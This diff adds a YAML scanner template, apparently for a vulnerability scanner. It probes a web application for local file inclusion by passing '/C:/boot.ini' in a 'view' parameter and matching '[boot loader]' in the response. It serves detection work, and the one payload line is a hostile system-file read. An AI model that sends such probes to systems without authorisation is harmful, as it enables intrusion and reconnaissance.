@@ -1,0 +1,20 @@
+id: lfi4-55
+name: 'System file /C:/boot.ini via view'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /C:/boot.ini via view'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      view:
+        - '/C:/boot.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[boot loader]'
